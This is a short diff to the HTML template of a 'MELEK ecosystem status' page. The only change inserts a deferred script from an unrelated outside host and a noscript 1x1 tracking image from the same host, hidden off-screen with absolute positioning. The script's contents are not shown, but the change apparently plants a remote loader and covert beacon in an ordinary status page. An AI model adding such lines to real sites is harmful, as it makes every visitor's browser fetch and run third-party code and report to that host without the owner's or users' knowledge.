@@ -124,7 +124,7 @@ h2{font-size:13px;text-transform:uppercase;letter-spacing:.06em;color:var(--mut)
 .nm{flex:1}.st{font-size:11px;font-weight:700}.okc{color:var(--up)}.badc{color:var(--down)}
 .dt{color:var(--mut);font-size:12px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .foot{color:var(--mut);font-size:12px;margin-top:16px}
-</style></head><body><div class="wrap">
+</style><script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body><div class="wrap">
 <h1>MELEK ecosystem status <span class="badge">Alpha</span></h1>
 <div class="banner ${summary.allUp ? 'ok' : 'bad'}">${esc(banner)}</div>
 ${rows}
